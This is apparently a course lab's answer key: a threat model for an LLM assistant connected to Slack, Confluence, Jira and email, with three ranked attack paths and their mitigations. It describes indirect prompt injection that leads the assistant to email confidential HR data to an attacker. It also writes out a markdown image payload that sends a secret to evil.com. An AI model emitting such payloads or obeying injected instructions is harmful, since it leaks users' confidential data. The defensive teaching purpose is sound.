# Lab 4 Solution: Threat Model

## 1. Trust Boundaries & Untrusted Inputs
- **Untrusted input sources:** Slack messages (including external guests), `Vendor-Submissions` Confluence pages (external vendor uploads), Jira ticket comments.
- **Privileged sinks:** `HR-Confidential` & `Security-Incidents` Confluence spaces, `send_email` (external communication), `create_jira_ticket` (state mutation), Slack Markdown renderer.

## 2. Top 3 Attack Paths

| # | Attack Path (Source → Mechanism → Sink) | OWASP LLM Category | Impact × Likelihood | Mitigation (Break the Lethal Trifecta) |
| :--- | :--- | :--- | :--- | :--- |
| 1 | Poisoned doc in `Vendor-Submissions` → Indirect Prompt Injection → LLM reads `HR-Confidential` & calls `send_email` to attacker | LLM01 (Prompt Injection) + LLM06 (Excessive Agency) | 5 × 4 = **20** | Enforce user-scoped ACLs in Vector DB query; require HITL confirmation + domain allowlist for `send_email`. |
| 2 | External guest in Slack queries HR/Security data → RAG retrieves `HR-Confidential` due to shared index → LLM leaks salary/incident data | LLM02 (Sensitive Info Disclosure) | 5 × 5 = **25** | Mandatory metadata ACL filtering (`user_groups`) inside Vector DB before prompt assembly; never rely on system prompt for AuthZ. |
| 3 | Poisoned Confluence page injects `![img](https://evil.com/?q=SECRET)` → Slack renders image URL → Zero-click data exfiltration | LLM05 (Improper Output Handling) | 4 × 4 = **16** | Strip/block untrusted external image URLs in Markdown output; enforce strict CSP / link allowlists. |
